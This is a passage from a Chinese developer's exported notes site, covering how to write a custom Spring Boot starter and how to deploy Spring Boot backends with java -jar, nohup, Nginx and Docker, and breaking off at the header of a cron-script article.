<li>删去不必要的测试依赖，保留基础的 spring-boot-starter 就行。</li>
<li>删去不使用的插件</li>
</ul>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;2.7.5&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;top.uuanqin&lt;/groupId&gt;
    &lt;artifactId&gt;myrandom-spring-boot-starter&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
&lt;!--    描述类信息删掉--&gt;
&lt;!--    &lt;name&gt;myrandom-spring-boot-starter&lt;/name&gt;--&gt;
&lt;!--    &lt;description&gt;myrandom-spring-boot-starter&lt;/description&gt;--&gt;
    &lt;url/&gt;
    &lt;licenses&gt;
        &lt;license/&gt;
    &lt;/licenses&gt;
    &lt;developers&gt;
        &lt;developer/&gt;
    &lt;/developers&gt;
    &lt;scm&gt;
        &lt;connection/&gt;
        &lt;developerConnection/&gt;
        &lt;tag/&gt;
        &lt;url/&gt;
    &lt;/scm&gt;
    &lt;properties&gt;
        &lt;java.version&gt;17&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
        &lt;/dependency&gt;
&lt;!--        单元测试不需要，可以直接删掉--&gt;
&lt;!--        &lt;dependency&gt;--&gt;
&lt;!--            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;
&lt;!--            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;--&gt;
&lt;!--            &lt;scope&gt;test&lt;/scope&gt;--&gt;
&lt;!--        &lt;/dependency&gt;--&gt;
    &lt;/dependencies&gt;
&lt;!--    插件不需要，可以直接删掉--&gt;
&lt;!--    &lt;build&gt;--&gt;
&lt;!--        &lt;plugins&gt;--&gt;
&lt;!--            &lt;plugin&gt;--&gt;
&lt;!--                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;
&lt;!--                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;--&gt;
&lt;!--            &lt;/plugin&gt;--&gt;
&lt;!--        &lt;/plugins&gt;--&gt;
&lt;!--    &lt;/build&gt;--&gt;

&lt;/project&gt;
</code></pre>
<p>然后刷新并重新加载依赖。</p>
<p>因为 starter 模块仅仅进行依赖管理，我们需要对模块进行规整和清理：</p>
<ul>
<li>对 starter 模块文件夹下只要保留 <code>pom.xml</code> 文件即可，其余文件如 <code>.mvn</code>、<code>src</code>、<code>mvnw</code> 等全部删除。（如果有 <code>.iml</code> IDEA 配置文件文件可视情况保留）</li>
</ul>
<h2>创建 autoconfigure 模块</h2>
<p>创建过程同上。<code>pom.xml</code> 规整过程同上（即删除描述类信息、测试依赖以及插件）。</p>
<p>对于 autoconfigure 模块我们进行以下规整：除了保留 <code>pom.xml</code> 文件和 <code>.iml</code> 文件外，保留 <code>src</code> 文件夹用于存放编写的 Java 代码。<code>src</code> 文件夹需要删掉以下内容：</p>
<ul>
<li>删除启动类 <code>XXXSpringBootAutoconfigApplication</code>。作为第三方模块，我们不需要启动类。</li>
<li>删除配置文件 <code>application.properties</code></li>
<li>如果有的话，删除测试文件夹 <code>test.java</code> （不含）下的所有文件。</li>
</ul>
<h2>starter 模块引入 autoconfigure 模块</h2>
<p>在 starter 模块引入 autoconfigure 模块三要素。</p>
<pre><code class="language-xml">&lt;dependency&gt;
	&lt;groupId&gt;top.uuanqin&lt;/groupId&gt;
	&lt;artifactId&gt;myrandom-spring-boot-autoconfigure&lt;/artifactId&gt;
	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>刷新 Maven。</p>
<h2>编写 autoconfigure 模块</h2>
<p>autoconfigure 模块的 <code>pom.xml</code> 引入生成随机数所需要的依赖。比如，我们使用了 Hutool 提供的 <code>RandomUtil.randomNumbers</code> 生成一个指定长度的随机数字字符串。</p>
<blockquote>
<p><a href="https://plus.hutool.cn/">Hutool</a> 是一个小而全的 Java 工具类库，通过静态方法封装，降低相关 API 的学习成本，提高工作效率，使 Java 拥有函数式语言般的优雅，让 Java 语言也可以“甜甜的”。</p>
</blockquote>
<p>在 IDEA 创建模块的向导中，可以提前勾选依赖以自动引入 <code>spring-boot-configuration-processor</code>。<img src="https://cdn.gallery.uuanqin.top/img/20240717183928.webp" alt="image.png|475">或者自行在 <code>pom.xml</code> 中添加。</p>
<pre><code class="language-xml">&lt;!-- pom.xml --&gt;
&lt;!-- 需要引入的依赖 --&gt;

&lt;!--  hutool工具包 --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;cn.hutool&lt;/groupId&gt;
    &lt;artifactId&gt;hutool-all&lt;/artifactId&gt;
    &lt;version&gt;5.8.26&lt;/version&gt;
&lt;/dependency&gt;

&lt;!--  必要的依赖，用于写配置文件的依赖 --&gt;
&lt;dependency&gt;
	&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
	&lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;
	&lt;optional&gt;true&lt;/optional&gt;
&lt;/dependency&gt;
...
&lt;dependency&gt;
	...
&lt;/dependency&gt;
</code></pre>
<p>定义参数配置类：</p>
<pre><code class="language-java">// 定义参数配置类
// 可以使用 Lombok 的 @Data 注解免去手写Getter和Setter  
// 去掉 @Component。因为如果定义 @Component，使用这个starter的项目的人需要知道这个包的位置，并通过@ComponentScan扫描注入Bean，这显然是不合理的。
@ConfigurationProperties(prefix = &quot;myrandom&quot;)  
public class MyRandomProperties {  
	private int length;  
	  
	public int getLength() {  
		return length;  
	}  
	  
	public void setLength(int length) {  
		this.length = length;  
	}  
}

</code></pre>
<blockquote>
<p>[!hint] <code>@ConfigurationProperties</code> 注解<br>
和配置文件（比如 <code>application.yml</code>）进行绑定，将配置文件中对应的配置映射到对象的属性中。在这里是把配置文件 <code>myrandom.lenth</code> 中的值映射到 <code>MyRandomProperties</code> 对象的 <code>length</code> 中。详见：<a href="#2487324783" title="SpringBoot 中的配置" class="record-link ">SpringBoot 中的配置</a>。</p>
</blockquote>
<p>写自己的工具类，也就是我们要提供的服务：</p>
<pre><code class="language-java">// 自己写一个工具类
// 这里不需要 @Component。理由同上。
public class MyRandomUtils {

    private MyRandomProperties myRandomProperties;

    public MyRandomProperties getMyRandomProperties() {
        return myRandomProperties;
    }

    public void setMyRandomProperties(MyRandomProperties myRandomProperties) {
        this.myRandomProperties = myRandomProperties;
    }


    /**
     * 提供给外部的函数
     * @return
     */
    public String getRamdomNumber(){
        return RandomUtil.randomNumbers(myRandomProperties.getLength());
    }

}
</code></pre>
<p>新增一个自动配置类：<code>MyRamdomAutoConfiguration</code></p>
<pre><code class="language-java">@Configuration // 配置类
@EnableConfigurationProperties(MyRandomProperties.class) // 回忆，上面在MyRandomProperties类的定义中，它并不是一个Bean，此时通过本注解使其变为一个Bean
public class MyRamdomAutoConfiguration {

    /**
     * 返回对象类型为MyRandomUtils。方法名随便定义。
     * @param myRandomProperties
     * @return
     */
     // 回忆：在第三方 bean 需要依赖其它 bean 对象，直接在 bean 定义方法中设置形参即可，容器会根据类型自动装配。
    @Bean // 把MyRandomUtils声明为Bean
    public MyRandomUtils myRandomUtils(MyRandomProperties myRandomProperties){
        MyRandomUtils myRandomUtils = new MyRandomUtils();
        myRandomUtils.setMyRandomProperties(myRandomProperties);
        return myRandomUtils;
    }
}
</code></pre>
<blockquote>
<p>[!hint] <code>@Configuration</code> 注解<br>
告诉 Spring Boot 这是一个配置类，可以在该类中创建 Bean。更多声明第三方 Bean 细节详看：<a href="#1713466548" title="SpringBoot 中的 IOC & DI 入门" class="record-link ">SpringBoot 中的 IOC &amp; DI 入门</a></p>
</blockquote>
<p>在 <code>resources</code> 目录下新建文件 <code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code> ，文件中编写内容使得自动配置类 <code>MyRamdomAutoConfiguration</code> 能被 SpringBoot 加载。</p>
<pre><code class="language-text">top.uuanqin.MyRamdomAutoConfiguration
</code></pre>
<p>按顺序依次执行 Maven install 命令，将其安装为本地的依赖：</p>
<ul>
<li>Maven 中对 <code>myrandom-spring-boot-autoconfigure</code> 执行 install 命令</li>
<li>Maven 中对 <code>myrandom-spring-boot-starter</code> 执行 install 命令</li>
</ul>
<h2>使用自定义 Starter</h2>
<p>在任何需要使用自己编写的 SDK 项目中引入一个 starter 依赖：</p>
<pre><code class="language-xml">&lt;dependency&gt;
	&lt;groupId&gt;top.uuanqin&lt;/groupId&gt;
	&lt;artifactId&gt;myrandom-spring-boot-starter&lt;/artifactId&gt;
	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>配置文件：</p>
<pre><code class="language-yaml"># application.yml
myrandom:
  length: 5
</code></pre>
<p>Java 测试类中使用：</p>
<pre><code class="language-java">@SpringBootTest
class DemoInterfaceApplicationTests {
    @Resource
    private MyRandomUtils myRandomUtils;

    @Test
    void contextLoads() {
        UseUtils useUtils = new UseUtils();
        System.out.println(myRandomUtils.getRamdomNumber());
    }
}
</code></pre>
<p>完成。</p>
<h1>后记</h1>
<p>上面介绍案例的步骤可能比较多，分的模块比较细。但开发 starter 可以很灵活，不一定非得建立两个模块，也不一定非得全部建立案例中三个类，可以杂合在一起，跑通就行。</p>
<p>后续任务：</p>
<ul>
<li>[ ] 完成将自己的模块发布到 Maven 仓库</li>
</ul>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=187">Day14-05. SpringBoot原理-起步依赖_哔哩哔哩_bilibili</a></li>
<li><a href="https://yuyuanweb.feishu.cn/wiki/T4XgwM2Ynib71TkeGS5cXA0pn4e">知识星球·编程导航 - API 开放平台</a></li>
<li><a href="https://blog.csdn.net/Yang_Cpp/article/details/113486392">Maven：IDEA 将普通模块转换为maven模块_maven项目子模块怎么标为maven-CSDN博客</a></li>
<li><a href="https://doc.hutool.cn/pages/index/">简介 | Hutool</a></li>
<li><a href="https://docs.spring.io/spring-boot/docs/2.7.5/reference/html/configuration-metadata.html#appendix.configuration-metadata.annotation-processor">Configuration Metadata (spring.io)</a></li>
<li><a href="https://blog.csdn.net/qq_44887733/article/details/117450788">Autowired must be defined in Spring bean @Component/@Service_autowired members must be defined in valid spring -CSDN博客</a></li>
<li><a href="https://javaguide.cn/system-design/framework/spring/spring-common-annotations.html#_1-springbootapplication">Spring&amp;SpringBoot常用注解总结 | JavaGuide</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI1NDczNTAwMA==&amp;mid=2247530836&amp;idx=1&amp;sn=2ed9f251e8ff211d7e1c2455e636d1ae&amp;chksm=e9c29ea3deb517b58bd0643ce5c1da63516a1a5de60b4cd2448cce4c41d67d281f4c85d1a67e&amp;token=720877586&amp;lang=zh_CN#rd">老弟竟然写了个库，牛x轰轰朝我炫耀！ (qq.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1713466548">
                            <a href="#1713466548">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 中的 IOC &amp; DI 入门</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!hint] <code>@Configuration</code> 注解<br>
告诉 Spring Boot 这是一个配置类，可以在该类中创建 Bean。更多声明第三方 Bean 细节详看：<a href="#1713466548" title="SpringBoot 中的 IOC & DI 入门" class="record-link highlight">SpringBoot 中的 IOC &amp; DI 入门</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2487324783">
                            <a href="#2487324783">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 中的配置</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!hint] <code>@ConfigurationProperties</code> 注解<br>
和配置文件（比如 <code>application.yml</code>）进行绑定，将配置文件中对应的配置映射到对象的属性中。在这里是把配置文件 <code>myrandom.lenth</code> 中的值映射到 <code>MyRandomProperties</code> 对象的 <code>length</code> 中。详见：<a href="#2487324783" title="SpringBoot 中的配置" class="record-link highlight">SpringBoot 中的配置</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2896927132">
                            <a href="#2896927132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SPI 概念及案例实践（上）</span>
                                
                                <div class="record-links-context hover">
                                    <p>更多参考详见本站文章：<a href="#565697069" title="SpringBoot 的原理以及写一个自定义 Starter" class="record-link highlight">SpringBoot 的原理以及写一个自定义 Starter</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1713466548">
                            <a href="#1713466548">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 中的 IOC &amp; DI 入门</span>
                                
                                <div class="record-links-context hover">
                                    <p>下面你可以立即移步这篇文章加深上面所学知识的印象：<a href="#565697069" title="SpringBoot 的原理以及写一个自定义 Starter" class="record-link highlight">SpringBoot 的原理以及写一个自定义 Starter</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2985240736" class="record">
            <header>
                <h1 class="record-title">SpringBoot 项目的上线方式</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('SpringBoot');">SpringBoot</button>
                    
                    <button class="btn" onclick="activeTag('Nginx');">Nginx</button>
                    
                    <button class="btn" onclick="activeTag('宝塔');">宝塔</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                    <button class="btn" onclick="activeTag('Java');">Java</button>
                    
                    <button class="btn" onclick="activeTag('Spring');">Spring</button>
                    
                    <button class="btn" onclick="activeTag('Docker');">Docker</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/24/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240723234813.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>备忘 SpringBoot 后端项目的部署方式</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>b1ef28a0</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>项目构建与多环境</h1>
<p>多环境的分类：</p>
<ol>
<li>本地环境。可以理解为自己的电脑。</li>
<li>开发环境。开发人员远程开发，连接同一台机器。</li>
<li>测试环境：用于完成单元测试 / 性能测试 / 功能测试 / 系统集成测试，拥有独立的数据库、独立的服务器</li>
<li>预发布环境：和正式环境一致，正式数据库，更严谨。</li>
<li>正式环境：线上的，公开对外访问的项目。尽量不要改动。</li>
<li>沙箱环境：用于实验的环境。</li>
</ol>
<p>通过配置环境区分多环境：</p>
<pre><code class="language-sh">application.yml  # 公共配置
application-prod.yml
application-test.yml
</code></pre>
<p>IDEA Maven 命令面板选择并执行对应项目的：<code>Lifecycle</code>-&gt;<code>package</code> 命令进行打包。命令执行完成后将在 target 目录生成 jar 包。</p>
<blockquote>
<p>[!hint] SpringBoot 项目打包操作依赖<br>
进行打包时需要引入 <code>spring-boot-maven-plugin</code>。不过基于官方骨架创建项目，会自动添加这个插件。</p>
</blockquote>
<blockquote>
<p>打包时可以在 IDEA 的 Maven 命令面板中选择 <code>Skip Tests</code> 禁掉单元测试。</p>
</blockquote>
<h1>本地部署</h1>
<p>执行以下命令：</p>
<pre><code class="language-sh">java -version # 确保Java可用
# 在启动时传入环境变量
java -jar .\my-backend-0.0.1-SNAPSHOT.jar --spring.profiles.active=prod # 指定环境为prod
</code></pre>
<p>这样 SpringBoot 项目就会使用 <code>application-prod.yml</code> 的配置。</p>
<pre><code># 观察 Springboot 启动日志可以看到
The following 1 profile is active: &quot;prod&quot;
</code></pre>
<h1>Linux+Nginx 部署</h1>
<pre><code class="language-sh"># 检查java安装情况
java --version

# openjdk version &quot;1.8.0_402&quot;
# OpenJDK Runtime Environment (build 1.8.0_402-b06)
# OpenJDK 64-Bit Server VM (build 25.402-b06, mixed mode)
</code></pre>
<p>把打好的 jar 包直接扔上服务器。假设我扔在这个目录中：<code>/var/www/temp_test</code>。必要时给予权限：</p>
<pre><code class="language-sh">chmod a+x my-backend-0.0.1-SNAPSHOT.jar
</code></pre>
<blockquote>
<p>也可以是：本地代码上传到仓库，然后服务器使用 Git 拉取代码，在服务器中运行 maven （服务器中需提前安装好 maven，并配置好仓库源）进行打包操作 <code>mvn package -DskipTests</code>。</p>
</blockquote>
<p>Linux 运行命令以启动项目（后台运行）：</p>
<pre><code class="language-sh">nohup java -jar ./my-backend-0.0.1-SNAPSHOT.jar &amp;
</code></pre>
<p>查看运行的程序：</p>
<pre><code class="language-sh">jobs # 查看运行程序
netstat -ntlp # 查看占用端口情况
jps # 查看运行的java程序
</code></pre>
<blockquote>
<p>关于 nohup 命令详看：<a href="#2445395019" title="Linux 使用 nohup 后台运行程序" class="record-link ">Linux 使用 nohup 后台运行程序</a></p>
</blockquote>
<p>Nginx 配置文件：</p>
<pre><code>server{
	server_name	projects.uuanqin.top; ;
	# 前端
	location / {
		root /var/www/temp_test/myapp;
		index	index.html	index.htm;
	}
	# 后端 顺便解决跨域
	location /api {
		proxy_pass http://localhost:8123;
	}
}
</code></pre>
<blockquote>
<p>前端项目部署方式可看：<a href="#1032806896" title="Ant Design Pro 前端项目初始化到部署上线" class="record-link ">Ant Design Pro 前端项目初始化到部署上线</a></p>
</blockquote>
<h1>Docker 容器部署</h1>
<p>Docker 是容器，可以将项目的环境（比如 java、nginx）和项目的代码一起打包成镜像，所有具有权限的用户都能下载镜像，更容易分发和移植。</p>
<p>启动项目时不需要敲更多的命令，而是通过下载镜像、启动镜像即可。</p>
<pre><code class="language-sh">docker --version # 验证Docker是否安装成功
</code></pre>
<p>Dockerfile 用于指定构建 Docker 镜像的方法，一般情况下不需要完全从 0 自己写，可以去 github、gitee 等托管平台参考同类项目（比如 springboot）参照写法。</p>
<p>Dockerfile 一般放置在项目的根目录中：</p>
<ul>
<li><code>FROM</code>：依赖的基础镜像</li>
<li><code>WORKDIR</code>：工作目录</li>
<li><code>COPY</code>：从本机复制文件</li>
<li><code>RUN</code>：执行命令</li>
<li><code>CMD</code> / <code>ENTRYPOINT</code>：指定运行容器时默认执行的命令，<code>ENTRYPOINT</code> 可以附加额外参数</li>
</ul>
<pre><code class="language-dockerfile"># Docker 镜像构建
# 依赖于基础镜像
FROM maven:3.5-jdk-8-alpine as builder

# Copy local code to the container image.
# 指定工作目录
WORKDIR /app
# 本地把代码复制到容器中（&quot;.&quot;指的是当前目录&quot;/app&quot;）
COPY pom.xml .
COPY src ./src

# 配置Maven源提升下载速度
COPY settings.xml /usr/share/maven/conf/settings.xml

# Build a release artifact.
# 执行Maven的打包命令
RUN mvn package -DskipTests

# Run the web service on container startup.
# 一些参数可以在启动Docker时覆盖掉，这里可以把环境参数写死
CMD [&quot;java&quot;,&quot;-jar&quot;,&quot;/app/target/my-backend-0.0.1-SNAPSHOT.jar&quot;,&quot;--spring.profiles.active=prod&quot;]

</code></pre>
<blockquote>
<p>Dockerfile 编写时，可以跳过 maven 的打包命令，直接将打好的 jar 包放入容器中也可以。这样还能减少体积，提升构建速度。</p>
</blockquote>
<p>因为上面的 Dockerfile 中我们交给容器执行 maven 的打包命令，但是容器中 maven 仓库源为默认地址，下载速度极慢。我们需要配置 Maven 的下载源更换为阿里的镜像仓库。在项目主目录加上 <code>settings.xml</code> 文件，文件内容为：</p>
<pre><code class="language-xml">&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;
          xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
          xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0
                      http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;
    &lt;localRepository/&gt;
    &lt;interactiveMode/&gt;
    &lt;usePluginRegistry/&gt;
    &lt;offline/&gt;
    &lt;pluginGroups/&gt;
    &lt;servers/&gt;
    &lt;mirrors&gt;
        &lt;mirror&gt;
            &lt;id&gt;aliyunmaven&lt;/id&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
            &lt;name&gt;阿里云公共仓库&lt;/name&gt;
            &lt;url&gt;https://maven.aliyun.com/repository/central&lt;/url&gt;
        &lt;/mirror&gt;
        &lt;mirror&gt;
            &lt;id&gt;repo1&lt;/id&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
            &lt;name&gt;central repo&lt;/name&gt;
            &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;
        &lt;/mirror&gt;
        &lt;mirror&gt;
            &lt;id&gt;aliyunmaven&lt;/id&gt;
            &lt;mirrorOf&gt;apache snapshots&lt;/mirrorOf&gt;
            &lt;name&gt;阿里云阿帕奇仓库&lt;/name&gt;
            &lt;url&gt;https://maven.aliyun.com/repository/apache-snapshots&lt;/url&gt;
        &lt;/mirror&gt;
    &lt;/mirrors&gt;
    &lt;proxies/&gt;
    &lt;activeProfiles/&gt;
    &lt;profiles&gt;
        &lt;profile&gt;
            &lt;repositories&gt;
                &lt;repository&gt;
                    &lt;id&gt;aliyunmaven&lt;/id&gt;
                    &lt;name&gt;aliyunmaven&lt;/name&gt;
                    &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;
                    &lt;layout&gt;default&lt;/layout&gt;
                    &lt;releases&gt;
                        &lt;enabled&gt;true&lt;/enabled&gt;
                    &lt;/releases&gt;
                    &lt;snapshots&gt;
                        &lt;enabled&gt;true&lt;/enabled&gt;
                    &lt;/snapshots&gt;
                &lt;/repository&gt;
                &lt;repository&gt;
                    &lt;id&gt;MavenCentral&lt;/id&gt;
                    &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;
                &lt;/repository&gt;
                &lt;repository&gt;
                    &lt;id&gt;aliyunmavenApache&lt;/id&gt;
                    &lt;url&gt;https://maven.aliyun.com/repository/apache-snapshots&lt;/url&gt;
                &lt;/repository&gt;
            &lt;/repositories&gt;
        &lt;/profile&gt;
    &lt;/profiles&gt;
&lt;/settings&gt;

</code></pre>
<p>这里演示在服务器中制作镜像。首先将代码上传到 Linux 服务器中。构建镜像：</p>
<pre><code class="language-sh"># 后端
docker build -t my-backend:v0.0.1 . # -t 打标签，&quot;.&quot;表示使用当前的目录的Dockerfile构建镜像
</code></pre>
<p>运行镜像：</p>
<pre><code class="language-sh"># 后端
docker run -p 8223:8123 -d my-backend:v0.0.1 # -d 表示后台运行
</code></pre>
<p>附 docker 常用命令：</p>
<pre><code class="language-sh">docker ps # 查看运行的镜像
docker kill &lt;CONTAINER...&gt; # 杀死运行中的容器
docker logs &lt;CONTAINER&gt; # 追踪容器的日志输出
docker images # 查看镜像
docker rmi -f IMAGE [IMAGE...] # 移除镜像
</code></pre>
<h1>其他方式</h1>
<h2>宝塔 Linux 部署</h2>
<p>宝塔是一款 Linux 运维面板软件。可以更方便管理服务器软件或部署项目。</p>
<p>官网下载：<a href="https://www.bt.cn/new/download.html">宝塔面板下载，免费全能的服务器运维软件 (bt.cn)</a></p>
<p>建议在纯新系统安装宝塔面板，不支持已经部署项目/环境的系统进行安装。</p>
<h2>容器托管平台的部署</h2>
<p>容器平台：</p>
<ul>
<li>云服务商的容器平台（腾讯云、阿里云）</li>
<li>面向某个领域的容器平台（前端 / 后端微信云托管）</li>
</ul>
<p>使用容器平台的优点：</p>
<ul>
<li>不需要购买云服务器</li>
<li>不用输命令来操作，更方便省事</li>
<li>不用在控制台操作，更傻瓜式、更简单</li>
<li>大厂运维，比自己运维更省心</li>
<li>额外的能力，比如监控、告警、其他（存储、负载均衡、自动扩缩容、流水线）</li>
</ul>
<p>微信云托管：<a href="https://cloud.weixin.qq.com/cloudrun/">微信云托管 (qq.com)</a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://yuyuanweb.feishu.cn/wiki/DclswHMhkiRXckkWve1ckXTonDh">知识星球·编程导航 - 用户中心项目</a></li>
<li><a href="https://www.bilibili.com/read/cv16179200/">如何部署网站？来比比谁的方法多 - 哔哩哔哩 (bilibili.com)</a></li>
<li><a href="https://www.bt.cn/new/download.html">宝塔面板下载，免费全能的服务器运维软件 (bt.cn)</a></li>
<li><a href="https://blog.csdn.net/m0_72578531/article/details/136341961">Linux安装和jdk教程和更换jdk版本教程_linux jdk升级-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/SEUNRain/article/details/122427093">解决centos8下安装docker提示“为 repo ‘docker-ce-stable‘ 下载元数据失败“的问题_error: 为仓库 'docker-ce-stable' 下载元数据失败 : cannot dow-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_37865672/article/details/131919182">dockerfile构建镜像报错 ERROR [internal] load metadata for docker.io/library/php:7.4-apache_=&gt; error [internal] load metadata for registry.cn--CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/zecoki/articles/18269713/docker">Docker官方2024.6停服后可用国内镜像地址更新 - Z科技 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/BlingblingFu/article/details/120769433">将Maven的Docker镜像修改为国内源_docker mvn 换源-CSDN博客</a></li>
<li><a href="https://www.jianshu.com/p/bcce4f53d186">在dockerfile中把maven的下载源更换为阿里的镜像仓库 - 简书 (jianshu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1032806896">
                            <a href="#1032806896">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_undefined);">⬤</span>
                                    
                                </span>
                                
                                <span>Ant Design Pro 前端项目初始化到部署上线</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>前端项目部署方式可看：<a href="#1032806896" title="Ant Design Pro 前端项目初始化到部署上线" class="record-link highlight">Ant Design Pro 前端项目初始化到部署上线</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2445395019">
                            <a href="#2445395019">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 使用 nohup 后台运行程序</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>关于 nohup 命令详看：<a href="#2445395019" title="Linux 使用 nohup 后台运行程序" class="record-link highlight">Linux 使用 nohup 后台运行程序</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2487324783">
                            <a href="#2487324783">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_java);">⬤</span>
                                    
                                </span>
                                
                                <span>SpringBoot 中的配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>关于 SpringBoot 项目的部署方式详见本站文章：<a href="#2985240736" title="SpringBoot 项目的上线方式" class="record-link highlight">SpringBoot 项目的上线方式</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3118126311" class="record">
            <header>
                <h1 class="record-title">利用 Cron 编写简单的定时脚本（含简易的 CDN 攻击预警）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('GitHub');">GitHub</button>
                    
                    <button class="btn" onclick="activeTag('cron');">cron</button>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('Webhook');">Webhook</button>
                    
                    <button class="btn" onclick="activeTag('script');">script</button>
                    
                    <button class="btn" onclick="activeTag('SDK');">SDK</button>
                    
                    <button class="btn" onclick="activeTag('CDN');">CDN</button>
                    
                    <button class="btn" onclick="activeTag('腾讯云');">腾讯云</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/24/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
